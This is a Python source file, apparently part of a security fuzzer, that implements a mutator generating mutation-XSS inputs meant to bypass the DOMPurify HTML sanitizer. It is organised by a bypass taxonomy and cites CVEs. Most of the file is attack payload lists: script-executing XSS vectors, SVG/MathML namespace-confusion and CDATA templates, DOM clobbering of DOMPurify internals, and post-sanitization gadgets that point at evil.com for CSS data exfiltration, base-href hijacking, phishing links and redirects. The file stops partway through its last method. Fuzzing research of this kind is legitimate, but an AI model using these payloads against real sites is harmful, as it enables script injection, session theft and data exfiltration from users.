"""Mutation XSS (mXSS) taxonomy-driven mutator — DOMPurify bypass edition.

Encodes structural attack patterns from the DOMPurify bypass taxonomy
and 1-day analysis report into a semantic-level mutator. Each strategy
targets a specific bypass category proven effective against DOMPurify.

Taxonomy sections mapped to strategies (updated from full taxonomy):
  §1-1 MathML integration point   → namespace_wrap, mathml_integration_point
  §1-2 SVG namespace style        → svg_style_breakout
  §1-3 Comment-based smuggling    → comment_smuggling
  §2-1 Node flattening            → nesting_depth_bomb (CVE-2024-47875)
  §2-2 Elevator mutation           → elevator_mutation
  §2-3 Triple-parse form reorder  → triple_parse_form, form_collapse
  §3   DOM clobbering             → dom_clobbering
  §4-1 Template literal regex     → template_regex_bypass (CVE-2025-26791)
  §4-3 SVG xmlns injection        → xmlns_prefix_injection
  §5-1 Custom element handling    → custom_element_confusion
  §5-4 Parser media type          → xhtml_mode_injection
  §6-1 Serialize-parse roundtrip  → rawtext_confusion, noscript_differential
  §7   Post-sanitization gadgets  → post_sanitization_gadget
"""

from __future__ import annotations

import random
from typing import TYPE_CHECKING

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

# ── XSS payload pool ─────────────────────────────────────────────

XSS_PAYLOADS = [
    b"<img src=x onerror=alert(1)>",
    b"<svg onload=alert(1)>",
    b"<body onload=alert(1)>",
    b"<script>alert(1)</script>",
    b'<a href="javascript:alert(1)">click</a>',
    b"<input autofocus onfocus=alert(1)>",
    b"<details open ontoggle=alert(1)>",
    b"<marquee onstart=alert(1)>",
    b"<video><source onerror=alert(1)>",
    b'<iframe src="javascript:alert(1)">',
    b"<embed src=javascript:alert(1)>",
    b"<object data=javascript:alert(1)>",
    b'<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    b'<svg><set onbegin=alert(1) attributeName=x to=y>',
]

# ── §1-1 MathML integration point wrappers ───────────────────────

NAMESPACE_WRAPPERS = [
    # SVG integration points (§1-2)
    (b"<svg><desc>", b"</desc></svg>"),
    (b"<svg><title>", b"</title></svg>"),
    (b"<svg><foreignObject>", b"</foreignObject></svg>"),
    (
        b'<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">',
        b"</body></foreignObject></svg>",
    ),
    # MathML text integration points (§1-1)
    (b"<math><mtext>", b"</mtext></math>"),
    (b"<math><mi>", b"</mi></math>"),
    (b"<math><mo>", b"</mo></math>"),
    (b"<math><ms>", b"</ms></math>"),
    (b"<math><mn>", b"</mn></math>"),
    # annotation-xml HTML/XHTML integration points (§1-1)
    (
        b'<math><annotation-xml encoding="text/html">',
        b"</annotation-xml></math>",
    ),
    (
        b'<math><annotation-xml encoding="application/xhtml+xml">',
        b"</annotation-xml></math>",
    ),
    # mglyph/malignmark — namespace flip targets (CVE-2020-26870)
    (b"<math><mtext><mglyph>", b"</mglyph></mtext></math>"),
    (b"<math><mtext><malignmark>", b"</malignmark></mtext></math>"),
    (b"<math><mi><mglyph>", b"</mglyph></mi></math>"),
    (b"<math><mo><malignmark>", b"</malignmark></mo></math>"),
]

# ── §1-2 SVG style breakout patterns ─────────────────────────────

SVG_STYLE_BREAKOUT_PATTERNS = [
    # Style in SVG: children parsed as elements, not RAWTEXT
    b'<svg><style><a id="{CONTENT}"></a></style></svg>',
    b'<svg><style><a id="</style><img src=x onerror=alert(1)>"></a></style></svg>',
    # SVG desc/title as HTML integration points
    b"<svg><desc><style>{CONTENT}</style></desc></svg>",
    b"<svg><title><style>{CONTENT}</style></title></svg>",
    # image-to-img conversion (§2-2 elevator prerequisite)
    b"<svg><image><desc><style>{CONTENT}</style></desc></image></svg>",
]

# ── §1-3 Comment-based namespace smuggling ────────────────────────

COMMENT_SMUGGLING_PATTERNS = [
    # Comment in attribute (serialize breaks context)
    b'<math><mtext><style><!-- {CONTENT} --></style></mtext></math>',
    # Incorrectly opened comment (WHATWG <!...> form)
    b"<math><mi><style><! {CONTENT}</style></mi></math>",
    b"<math><mi><li><table><li></li><a><style><! {CONTENT}</style></a></table></li></mi></math>",
    # Comment-after-style
    b"<math><style><!--</style>{CONTENT}--></math>",
    b"<math><mtext><table><mglyph><style><!--</style>{CONTENT}--></mtext></math>",
    # Bang comment close (--!>) — different handling across namespaces
    b"<!-- --!>{CONTENT}",
    b"<!--><svg onload=alert(1)>-->",
    # CDATA in foreign content
    b"<svg><style><![CDATA[</style>{CONTENT}]]></style></svg>",
    b"<math><mtext><table><mglyph><style><![CDATA[</style>{CONTENT}]]></style></mtext></math>",
]

# ── Triple namespace templates (§1 multi-hop) ────────────────────

TRIPLE_NS_TEMPLATES = [
    b"<math><mtext><svg><foreignObject>{CONTENT}</foreignObject></svg></mtext></math>",
    b"<svg><foreignObject><math><mtext>{CONTENT}</mtext></math></foreignObject></svg>",
    b'<math><annotation-xml encoding="text/html"><svg><foreignObject>{CONTENT}</foreignObject></svg></annotation-xml></math>',
    b"<svg><desc><math><mi><table><mglyph><style>{CONTENT}</style></mglyph></table></mi></math></desc></svg>",
    b"<math><mtext><svg><desc><math><annotation-xml>{CONTENT}</annotation-xml></math></desc></svg></mtext></math>",
]

# ── §2-1 Depth flattening + caption insertion mode (CVE-2024-47875) ──

DEPTH_FLATTENING_PAYLOADS = [
    # Depth + SVG style breakout
    (b"<table><caption><svg><title><table><caption></caption></table></title>"
     b'<style><a id="</style>{CONTENT}"></a></style></svg></caption></table>'),
    # Depth + MathML style
    (b"<table><caption><math><mtext><style>{CONTENT}</style></mtext></math></caption></table>"),
    # Depth + SVG desc style
    (b"<svg><desc><style>{CONTENT}</style></desc></svg>"),
]

# ── §2-2 Elevator mutation patterns ──────────────────────────────

ELEVATOR_PATTERNS = [
    # button/li/dd/dt pop the stack, elevating subsequent elements
    b"<button><svg><image><desc><style>{CONTENT}</style></desc></image></svg></button>",
    b"<li><svg><image><desc><style>{CONTENT}</style></desc></image></svg></li>",
    b"<dd><svg><image><desc><style>{CONTENT}</style></desc></image></svg></dd>",
    b"<dt><svg><image><desc><style>{CONTENT}</style></desc></image></svg></dt>",
    # image-to-img namespace escape (no HTML integration point needed)
    b"<svg><image><a><desc><svg><image></image></svg></desc></a></image>"
    b'<style><a id="</style>{CONTENT}"></a></style></svg>',
]

# ── §2-3 Triple-parse form reordering ─────────────────────────────

TRIPLE_PARSE_PATTERNS = [
    # Form reordering cascade (defeats double sanitization)
    b"<form><h1></form><table><form></form></table></form></table></h1></form>"
    b"<math><mi><style><!--</style>"
    b'<style id="--></style></mi></math>{CONTENT}"></style></mi></math>',
    # Table foster parenting form reorder
    b"<form></form><table><form></form></table>"
    b"<math><mtext><style>{CONTENT}</style></mtext></math>",
]

# ── §2-3 Form collapse patterns ──────────────────────────────────

FORM_COLLAPSE_PATTERNS = [
    # CVE-2020-26870 pattern: nested form drops, mglyph flips namespace
    b"<form><math><mtext></form><form><mglyph><style>{CONTENT}</style></mglyph></form></mtext></math>",
    b"<form><div></form><form><div>{CONTENT}</div></form>",
    b"<form><table><tr><td></form><form>{CONTENT}</form></td></tr></table>",
    b"<form>{CONTENT}</form><form><svg><desc><img src=x onerror=alert(1)></desc></svg></form>",
    # Form + marquee/applet/object (foster parenting triggers)
    b"<form><math><mtext></form><form><marquee><mglyph><style>{CONTENT}</style></mglyph></marquee></form></mtext></math>",
    b"<form></form><table><form><math><mtext><style>{CONTENT}</style></mtext></math></form></table>",
]

# ── §3-1 DOM clobbering patterns ─────────────────────────────────

DOM_CLOBBERING_PATTERNS = [
    # parentNode clobbering (DOMPurify 3.1.1)
    b'<form id="x ">{DEPTH}<svg><style>{CONTENT}</style></svg></form>'
    b'<input form="x" name="parentNode">',
    # __depth clobbering (DOMPurify 3.1.2)
    b'<form id="x ">{DEPTH}<svg><style>{CONTENT}</style></svg></form>'
    b'<input form="x" name="__depth">',
    # remove() clobbering (DOMPurify 3.1.3–3.1.4)
    b'<form id="x"><input name="remove"><math><mtext><mglyph><style>'
    b"{CONTENT}</style></mglyph></mtext></math></form>",
    # Double clobbering: parentNode + __depth
    b'<form id="x ">{DEPTH}<svg><style>{CONTENT}</style></svg></form>'
    b'<input form="x" name="parentNode"><input form="x" name="__depth">',
]

# ── §4-1 Template literal regex bypass (CVE-2025-26791) ──────────

TEMPLATE_BYPASS_PATTERNS = [
    # Missing closing brace — ${ without } bypasses TMPLIT_EXPR
    b"<math><mi><style><! ${ </style>{CONTENT}</mi></math>",
    b"<math><mtext><style>${ </style>{CONTENT}</mtext></math>",
    # ERB/Mustache template markers (also removed by SAFE_FOR_TEMPLATES)
    b"<math><mtext><style><%= </style>{CONTENT} %></mtext></math>",
    b"<math><mtext><style>{{ </style>{CONTENT} }}</mtext></math>",
    # Combined: incorrectly opened comment + template
    b"<math><mi><li><table><li></li><a><style><! ${ </style> } {CONTENT}></a></table></li></mi></math>",
]

# ── §4-3 SVG xmlns prefix injection ──────────────────────────────

XMLNS_INJECTION_PATTERNS = [
    # Custom namespace alias maps to xlink (data-attr regex anchor missing)
    b'<svg xmlns="http://www.w3.org/2000/svg" '
    b'xmlns:data-x="http://www.w3.org/1999/xlink">'
    b'<a data-x:href="javascript:alert(1)">click</a></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg" '
    b'xmlns:data-a="http://www.w3.org/1999/xlink">'
    b'<a data-a:href="javascript:alert(1)">{CONTENT}</a></svg>',
]

# ── §5-1 Custom element handling patterns ─────────────────────────

CUSTOM_ELEMENT_PATTERNS = [
    # annotation-xml confused as custom element (contains hyphen)
    b'<math><annotation-xml encoding="text/html">{CONTENT}</annotation-xml></math>',
    b'<math><annotation-xml encoding="text/html"><svg><foreignObject>'
    b"{CONTENT}</foreignObject></svg></annotation-xml></math>",
    # Fake custom elements with namespace triggers
    b"<math><foo-bar><mtext><style>{CONTENT}</style></mtext></foo-bar></math>",
    b"<svg><foo-test><desc><style>{CONTENT}</style></desc></foo-test></svg>",
]

# ── §5-4 Parser media type (XHTML mode) patterns ─────────────────

XHTML_MODE_PATTERNS = [
    # Processing Instruction injection (PI target = allowed tag name)
    b"<?img src=x onerror=alert(1)?>",
    b"<?svg onload=alert(1)?>",
    b"<?script?>alert(1)<?/script?>",
    # CDATA section in HTML (bogus comment ending at >)
    b"<![CDATA[><img src=x onerror=alert(1)>]]>",
    b"<svg><style><![CDATA[</style>{CONTENT}]]></style></svg>",
]

# ── §6-1 RAWTEXT confusion patterns ──────────────────────────────

RAWTEXT_INJECTIONS = [
    # style in foreign content — children are elements, not RAWTEXT
    b"<svg><style>{CONTENT}</style></svg>",
    b"<math><style>{CONTENT}</style></math>",
    b"<svg><desc><style>{CONTENT}</style></desc></svg>",
    b"<math><mtext><style>{CONTENT}</style></mtext></math>",
    # xmp/noembed/noframes in foreign context
    b"<svg><xmp>{CONTENT}</xmp></svg>",
    b"<math><noembed>{CONTENT}</noembed></math>",
    b"<svg><noframes>{CONTENT}</noframes></svg>",
    # CDATA in foreign content (valid in SVG/MathML, not in HTML)
    b"<svg><style><![CDATA[{CONTENT}]]></style></svg>",
    b"<math><style><![CDATA[{CONTENT}]]></style></math>",
]

# ── §6-1 noscript scripting-flag differential ─────────────────────

NOSCRIPT_PATTERNS = [
    b"<noscript>{CONTENT}</noscript>",
    b"<noscript><style>{CONTENT}</style></noscript>",
    b"<noscript><textarea>{CONTENT}</textarea></noscript>",
    b"<noscript><title>{CONTENT}</title></noscript>",
    # noscript + namespace switch
    b"<svg><noscript>{CONTENT}</noscript></svg>",
    b"<noscript><math><mtext>{CONTENT}</mtext></math></noscript>",
    b"<noscript><style></noscript>{CONTENT}",
]

# ── §6-1 Foster parenting patterns ────────────────────────────────

FOSTER_PATTERNS = [
    b"<table>{CONTENT}</table>",
    b"<table><style>{CONTENT}</style></table>",
    b"<table><caption>{CONTENT}</caption></table>",
    b"<table><tr><td><table>{CONTENT}</table></td></tr></table>",
    # Foster parenting + namespace switch
    b"<table><svg><desc>{CONTENT}</desc></svg></table>",
    b"<table><math><mtext>{CONTENT}</mtext></math></table>",
    b"<table><mglyph><style>{CONTENT}</style></mglyph></table>",
    b"<table><template>{CONTENT}</template></table>",
]

# ── §7 Post-sanitization gadget patterns ──────────────────────────

POST_SANITIZATION_PATTERNS = [
    # CSS exfiltration via allowed <style>
    b'<style>body { background: url("https://evil.com/steal?data=1"); }</style>',
    b'<style>input[value^="a"] { background: url("https://evil.com/a"); }</style>',
    b'<style>@import url("https://evil.com/inject.css");</style>',
    # Form-based CSRF (form allowed by default)
    b'<form action="/api/delete" method="POST"><button style="opacity:0;width:100%;height:100%">click</button></form>',
    # Base href pollution (base allowed by default)
    b'<base href="https://evil.com/">{CONTENT}',
    # Link redirection
    b'<a href="https://evil.com/phish">Click here</a>',
    # Meta refresh
    b'<meta http-equiv="refresh" content="0;url=https://evil.com/">',
    # DOM clobbering via id/name
    b'<form id="x"><img name="remove" src=x></form>',
    b'<a id="x" name="y" href="https://evil.com/">link</a>',
    # Self-closing div (jQuery gadget)
    b"<div/>{CONTENT}",
    b"<span/>{CONTENT}",
    b"<p/>{CONTENT}",
]

# ── CDATA attribute injection patterns (from Finding #645) ────────

CDATA_ATTR_INJECTION_PATTERNS = [
    # Core finding: CDATA as attribute value in SVG — bypasses DOMPurify
    b'<svg><polyline style=<![CDATA[<script>alert(1)</script>]]> points="0,0"/></svg>',
    b'<svg><rect style=<![CDATA["><img src=x onerror=alert(1)>]]>/></svg>',
    b'<svg><text style=<![CDATA[<script>{CONTENT}</script>]]>>x</text></svg>',
    # CDATA as href attribute value
    b'<svg><a href=<![CDATA[javascript:alert(1)]]>><text>click</text></a></svg>',
    b'<svg><use xlink:href=<![CDATA[javascript:alert(1)]]>/></svg>',
    b'<svg><animate attributeName="href" values=<![CDATA[javascript:alert(1)]]>/></svg>',
    b'<svg><set attributeName="href" to=<![CDATA[javascript:alert(1)]]>/></svg>',
    # CDATA as event handler attribute
    b'<svg><rect onload=<![CDATA[alert(1)]]>/></svg>',
    b'<svg><image onerror=<![CDATA[alert(1)]]> href="x"/></svg>',
    # CDATA boundary confusion in SVG style element
    b'<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>',
    b'<svg><style><![CDATA[</style>{CONTENT}]]></style></svg>',
    # Incomplete CDATA boundaries
    b'<svg><rect style=<![CDATA[{CONTENT}]>/></svg>',
    b'<svg><rect style=<![CDATA[{CONTENT}]]>/></svg>',
    b'<svg><rect style=<!CDATA[{CONTENT}]]>/></svg>',
    # CDATA in MathML attribute
    b'<math><mtext style=<![CDATA[<script>alert(1)</script>]]>>x</mtext></math>',
    b'<math><annotation encoding=<![CDATA[text/html"><img src=x onerror=alert(1)>]]>/></math>',
    # CDATA in foreignObject context
    b'<svg><foreignObject><p xmlns="http://www.w3.org/1999/xhtml" style=<![CDATA["><img/src=x onerror=alert(1)>]]>>x</p></foreignObject></svg>',
    # CDATA + depth nesting combo
    b'<div><div><div><div><div><svg><polyline style=<![CDATA[<script>alert(1)</script>]]> points="0,0"/></svg></div></div></div></div></div>',
    # CDATA + title/desc breakout
    b'<svg><title><![CDATA[</title><img src=x onerror=alert(1)><title>]]></title></svg>',
    b'<svg><desc><![CDATA[</desc><script>alert(1)</script><desc>]]></desc></svg>',
]

# ── Serializer coercion patterns ──────────────────────────────────

SERIALIZER_COERCION_PATTERNS = [
    # Boolean attribute without value + event handler
    b"<input type=hidden value= onfocus=alert(1) autofocus>",
    # xmlns with embedded event handler patterns
    b"<math xmlns=\"http://www.w3.org/1998/Mat' onload='alert(1)//h/MathML\">",
    # SVG case sensitivity — camelCase in SVG, lowercase in HTML
    b"<svg><clipPath><rect/></clipPath></svg>",
    b'<svg><animateTransform attributename="transform"/></svg>',
]

# ── Entity encoding maps (§4) ────────────────────────────────────

ENTITY_MAPS: dict[int, list[bytes]] = {
    ord("<"): [b"&lt;", b"&#60;", b"&#x3C;", b"&#x003C;", b"&#0000060;"],
    ord(">"): [b"&gt;", b"&#62;", b"&#x3E;", b"&#x003E;"],
    ord('"'): [b"&quot;", b"&#34;", b"&#x22;"],
    ord("'"): [b"&#39;", b"&#x27;", b"&apos;"],
    ord("&"): [b"&amp;", b"&#38;", b"&#x26;"],
}

DOUBLE_ENCODE_MAP: dict[int, list[bytes]] = {
    ord("<"): [b"&amp;lt;", b"&amp;#60;", b"&amp;#x3C;"],
    ord(">"): [b"&amp;gt;", b"&amp;#62;"],
    ord('"'): [b"&amp;quot;", b"&amp;#34;"],
}

# Maximum output size to prevent degenerate cases
MAX_OUTPUT_SIZE = 100_000

# Depth padding for clobbering strategies
_DEPTH_255 = b"<div>" * 255
_DEPTH_506 = b"<div>" * 506


class MxssMutator:
    """Mutation XSS taxonomy-driven mutator — DOMPurify bypass edition.

    Encodes structural HTML parsing behaviors that cause DOM mutations
    between sanitization and rendering. Strategies are weighted by
    historical CVE frequency and bypass effectiveness.
    """

    name = "mxss"

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)
        # Strategies ordered by taxonomy section — weights reflect
        # historical CVE frequency and combinatorial potential
        self._corpus: list[Seed] = []  # set by mutate() each call
        self._strategies = [
            # §1 Namespace switching (dominant bypass class)
            self._namespace_wrap,              # §1-1  weight: 14
            self._svg_style_breakout,          # §1-2  weight: 8
            self._comment_smuggling,           # §1-3  weight: 8
            self._triple_namespace_nest,       # §1    weight: 6
            # §2 Nesting depth exploitation (CVE-2024-47875 class)
            self._nesting_depth_bomb,          # §2-1  weight: 10
            self._elevator_mutation,           # §2-2  weight: 6
            self._triple_parse_form,           # §2-3  weight: 4
            self._form_collapse,               # §2-3  weight: 5
            self._foster_parenting_trigger,    # §2-1  weight: 5
            # §3 DOM clobbering / property pollution
            self._dom_clobbering,              # §3    weight: 7
            # §4 Regex / pattern deficiencies
            self._template_regex_bypass,       # §4-1  weight: 5
            self._xmlns_prefix_injection,      # §4-3  weight: 3
            # §5 Configuration-dependent
            self._custom_element_confusion,    # §5-1  weight: 3
            self._xhtml_mode_injection,        # §5-4  weight: 2
            # §6 Context differential
            self._rawtext_confusion,           # §6-1  weight: 5
            self._noscript_differential,       # §6-1  weight: 3
            # §7 Post-sanitization gadgets
            self._post_sanitization_gadget,    # §7    weight: 3
            # CDATA attribute injection (Finding #645)
            self._cdata_attr_injection,        # §1+§6 weight: 10
            # Encoding / coercion
            self._entity_double_decode,        # §4    weight: 2
            self._serializer_coercion,         #       weight: 1
            # Corpus crossover
            self._corpus_splice,               #       weight: 8
        ]
        self._weights = [
            14, 8, 8, 6,   # §1 namespace switching
            10, 6, 4, 5, 5,  # §2 nesting/depth
            7,              # §3 clobbering
            5, 3,           # §4 regex
            3, 2,           # §5 config
            5, 3,           # §6 context
            3,              # §7 gadgets
            10,             # CDATA attr injection (proven effective)
            2, 1,           # encoding/coercion
            8,              # corpus splice (cross-pollination)
        ]

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        self._corpus = corpus
        data = bytearray(inp.data)
        if len(data) < 4:
            data = bytearray(self.rng.choice(XSS_PAYLOADS))

        # Apply 1-4 stacked strategies (more stacking = more combinatorial)
        num_ops = self.rng.choices([1, 2, 3, 4], weights=[40, 30, 20, 10], k=1)[0]
        for _ in range(num_ops):
            strategy = self.rng.choices(
                self._strategies, weights=self._weights, k=1
            )[0]
            data = strategy(data)

        # Size limit
        if len(data) > MAX_OUTPUT_SIZE:
            data = data[:MAX_OUTPUT_SIZE]

        return Input(
            data=bytes(data),
            metadata={**inp.metadata, "mutator": self.name},
        )

    # ── §1-1 MathML/SVG namespace wrapping ────────────────────────

    def _namespace_wrap(self, data: bytearray) -> bytearray:
        """Wrap content in namespace-switching structures (§1-1)."""
        prefix, suffix = self.rng.choice(NAMESPACE_WRAPPERS)
        pos = min(
            self.rng.randint(0, max(len(data) - 1, 0)),
            self.rng.randint(0, max(len(data) - 1, 0)),
        )
        return bytearray(
            bytes(data[:pos]) + prefix + bytes(data[pos:]) + suffix
        )

    # ── §1-2 SVG style breakout ───────────────────────────────────

    def _svg_style_breakout(self, data: bytearray) -> bytearray:
        """Exploit SVG <style> child-as-element parsing (§1-2)."""
        pattern = self.rng.choice(SVG_STYLE_BREAKOUT_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §1-3 Comment-based namespace smuggling ────────────────────

    def _comment_smuggling(self, data: bytearray) -> bytearray:
        """Smuggle content via comment patterns across namespaces (§1-3)."""
        # Mode 1: mutate existing --> to --!>
        if b"-->" in data and self.rng.random() < 0.3:
            return bytearray(bytes(data).replace(b"-->", b"--!>", 1))

        pattern = self.rng.choice(COMMENT_SMUGGLING_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §1 Triple namespace nesting ───────────────────────────────

    def _triple_namespace_nest(self, data: bytearray) -> bytearray:
        """Create triple-namespace-switching chains (§1)."""
        template = self.rng.choice(TRIPLE_NS_TEMPLATES)
        content = self._pick_content(data)
        return bytearray(template.replace(b"{CONTENT}", content))

    # ── §2-1 Nesting depth bomb (CVE-2024-47875) ─────────────────

    def _nesting_depth_bomb(self, data: bytearray) -> bytearray:
        """Deep nesting to trigger browser DOM flattening (§2-1).

        Based on CVE-2024-47875: browsers flatten at ~512 depth,
        relocating SVG/MathML <style> to HTML namespace where
        children become RAWTEXT.
        """
        depth = self.rng.choice([255, 506, 510, 512, 513])
        tag = self.rng.choice([b"div", b"span", b"p", b"a", b"b", b"i"])
        open_tag = b"<" + tag + b">"
        close_tag = b"</" + tag + b">"

        # Pick a depth-dependent payload pattern
        payload_template = self.rng.choice(DEPTH_FLATTENING_PAYLOADS)
        content = self._pick_content(data)
        payload = payload_template.replace(b"{CONTENT}", content)

        return bytearray(open_tag * depth + payload + close_tag * depth)

    # ── §2-2 Elevator mutation ────────────────────────────────────

    def _elevator_mutation(self, data: bytearray) -> bytearray:
        """Use stack-popping elements to elevate content (§2-2)."""
        depth = self.rng.choice([254, 255, 504])
        tag = self.rng.choice([b"div", b"span", b"p"])
        open_tag = b"<" + tag + b">"
        close_tag = b"</" + tag + b">"

        pattern = self.rng.choice(ELEVATOR_PATTERNS)
        content = self._pick_content(data)
        inner = pattern.replace(b"{CONTENT}", content)

        return bytearray(open_tag * depth + inner + close_tag * depth)

    # ── §2-3 Triple-parse form reordering ─────────────────────────

    def _triple_parse_form(self, data: bytearray) -> bytearray:
        """Form reordering cascade defeating double sanitization (§2-3)."""
        pattern = self.rng.choice(TRIPLE_PARSE_PATTERNS)
        content = self._pick_content(data)
        # Repeat the form-reorder preamble for depth
        repeat = self.rng.choice([1, 5, 50, 510])
        preamble = b"<form><h1></form><table><form></form></table></form></table></h1></form>"
        result = preamble * repeat + pattern.replace(b"{CONTENT}", content)
        return bytearray(result)

    # ── §2-3 Form collapse ────────────────────────────────────────

    def _form_collapse(self, data: bytearray) -> bytearray:
        """Exploit nested form collapse for DOM restructuring (§2-3)."""
        pattern = self.rng.choice(FORM_COLLAPSE_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §2-1 Foster parenting ─────────────────────────────────────

    def _foster_parenting_trigger(self, data: bytearray) -> bytearray:
        """Trigger foster parenting via table misplacement (§2-1)."""
        pattern = self.rng.choice(FOSTER_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §3 DOM clobbering ─────────────────────────────────────────

    def _dom_clobbering(self, data: bytearray) -> bytearray:
        """Override DOMPurify internal properties via named elements (§3).

        Targets: parentNode, __depth, remove(), __removalCount.
        Combined with depth nesting for maximum effect.
        """
        pattern = self.rng.choice(DOM_CLOBBERING_PATTERNS)
        content = self._pick_content(data)
        # Generate depth padding
        depth_count = self.rng.choice([100, 200, 255])
        depth_pad = b"<div>" * depth_count
        result = pattern.replace(b"{CONTENT}", content).replace(b"{DEPTH}", depth_pad)
        return bytearray(result)

    # ── §4-1 Template literal regex bypass (CVE-2025-26791) ───────

    def _template_regex_bypass(self, data: bytearray) -> bytearray:
        """Bypass SAFE_FOR_TEMPLATES regex (§4-1).

        CVE-2025-26791: ${ without closing } bypassed TMPLIT_EXPR.
        Combined with incorrectly opened comment <!.
        """
        pattern = self.rng.choice(TEMPLATE_BYPASS_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §4-3 xmlns prefix injection ───────────────────────────────

    def _xmlns_prefix_injection(self, data: bytearray) -> bytearray:
        """Inject custom namespace alias for javascript: href (§4-3)."""
        pattern = self.rng.choice(XMLNS_INJECTION_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §5-1 Custom element handling confusion ────────────────────

    def _custom_element_confusion(self, data: bytearray) -> bytearray:
        """Exploit permissive custom element regex (§5-1).

        annotation-xml contains a hyphen and can be misidentified
        as a custom element, creating namespace integration points.
        """
        pattern = self.rng.choice(CUSTOM_ELEMENT_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §5-4 XHTML mode injection ─────────────────────────────────

    def _xhtml_mode_injection(self, data: bytearray) -> bytearray:
        """Inject PI or CDATA for XHTML parsing mode (§5-4)."""
        pattern = self.rng.choice(XHTML_MODE_PATTERNS)
        if b"{CONTENT}" in pattern:
            content = self._pick_content(data)
            return bytearray(pattern.replace(b"{CONTENT}", content))
        if self.rng.random() < 0.5:
            return bytearray(pattern + bytes(data))
        return bytearray(bytes(data) + pattern)

    # ── §6-1 RAWTEXT confusion ────────────────────────────────────

    def _rawtext_confusion(self, data: bytearray) -> bytearray:
        """Exploit RAWTEXT element behavior across namespaces (§6-1)."""
        pattern = self.rng.choice(RAWTEXT_INJECTIONS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §6-1 noscript scripting-flag differential ─────────────────

    def _noscript_differential(self, data: bytearray) -> bytearray:
        """Exploit noscript scripting-flag differential (§6-1)."""
        pattern = self.rng.choice(NOSCRIPT_PATTERNS)
        content = self._pick_content(data)
        return bytearray(pattern.replace(b"{CONTENT}", content))

    # ── §7 Post-sanitization gadgets ──────────────────────────────

    def _post_sanitization_gadget(self, data: bytearray) -> bytearray:
        """Inject allowed-but-dangerous elements (§7).

        CSS exfiltration, form CSRF, base pollution, meta refresh,
        DOM clobbering via sanitized output.
        """
        pattern = self.rng.choice(POST_SANITIZATION_PATTERNS)
        if b"{CONTENT}" in pattern:
            content = self._pick_content(data)
            return bytearray(pattern.replace(b"{CONTENT}", content))
        if self.rng.random() < 0.5:
            return bytearray(pattern + bytes(data))
        return bytearray(bytes(data) + pattern)

    # ── CDATA attribute injection (from Finding #645) ──────────────

    def _cdata_attr_injection(self, data: bytearray) -> bytearray:
        """Inject CDATA sections as attribute values in SVG/MathML context.

        Exploits parser confusion where CDATA boundaries are not properly
        handled as attribute values, allowing <script> text to survive
        sanitization. Based on Finding #645 from session 29.
        """
        pattern = self.rng.choice(CDATA_ATTR_INJECTION_PATTERNS)
        if b"{CONTENT}" in pattern:
            content = self._pick_content(data)
            return bytearray(pattern.replace(b"{CONTENT}", content))
        if self.rng.random() < 0.5:
            return bytearray(pattern + bytes(data))
        return bytearray(bytes(data) + pattern)

    # ── Entity encoding (§4) ──────────────────────────────────────

    def _entity_double_decode(self, data: bytearray) -> bytearray:
        """Create multi-layer entity encoding (§4)."""
        use_double = self.rng.random() < 0.3
        encode_map = DOUBLE_ENCODE_MAP if use_double else ENTITY_MAPS
        result = bytearray()
        for byte_val in data:
            if byte_val in encode_map and self.rng.random() < 0.3:
                result.extend(self.rng.choice(encode_map[byte_val]))
            else:
                result.append(byte_val)
        return result

    # ── Serializer coercion ───────────────────────────────────────

    def _serializer_coercion(self, data: bytearray) -> bytearray:
        """Craft inputs that become dangerous after sanitization."""
        pattern = self.rng.choice(SERIALIZER_COERCION_PATTERNS)
        if self.rng.random() < 0.5:
            return bytearray(pattern + bytes(data))
        return bytearray(bytes(data) + pattern)

    # ── Helpers ───────────────────────────────────────────────────

    def _pick_content(self, data: bytearray) -> bytes:
        """Pick content for template substitution.

        Distribution: 20% corpus fragment, 20% XSS payload, 60% input fragment.
        Corpus fragments enable cross-pollination of structural patterns
        between different interesting inputs discovered during fuzzing.
        """
        r = self.rng.random()
        # 20% — corpus fragment (cross-pollination)
        if r < 0.2 and self._corpus and len(self._corpus) > 1:
            donor = self.rng.choice(self._corpus)
            donor_data = donor.input.data
            if len(donor_data) >= 4:
                max_len = min(len(donor_data), 500)
                start = self.rng.randint(0, max(len(donor_data) - max_len, 0))
                return donor_data[start : start + max_len]
        # 20% — XSS payload pool (or fallback for short inputs)
        if r < 0.4 or len(data) < 4:
            return self.rng.choice(XSS_PAYLOADS)
        # 60% — fragment of current input
        max_len = min(len(data), 500)
        start = self.rng.randint(0, max(len(data) - max_len, 0))
        return bytes(data[start : start + max_len])

    def _corpus_splice(self, data: bytearray) -> bytearray:
        """Splice a tag fragment from a random corpus seed into current input.

        Finds an opening tag boundary in a donor seed and inserts the
        fragment at a random position. Enables structural crossover —
        combining interesting tag patterns from different corpus entries.
        Falls back to namespace_wrap when corpus is insufficient.
        """
        if not self._corpus or len(self._corpus) < 2:
            return self._namespace_wrap(data)

        donor = self.rng.choice(self._corpus)
        donor_data = donor.input.data

        # Find opening tag boundaries in donor
        tag_starts = [
            i for i in range(len(donor_data) - 1)
            if donor_data[i:i + 1] == b"<" and donor_data[i + 1:i + 2] != b"/"
        ]
        if not tag_starts:
            return self._namespace_wrap(data)

        frag_start = self.rng.choice(tag_starts)
        frag_end = min(
            frag_start + self.rng.randint(50, 500), len(donor_data)
        )
        fragment = donor_data[frag_start:frag_end]

        # Insert at a random position in current data
        pos = self.rng.randint(0, max(len(data), 1))
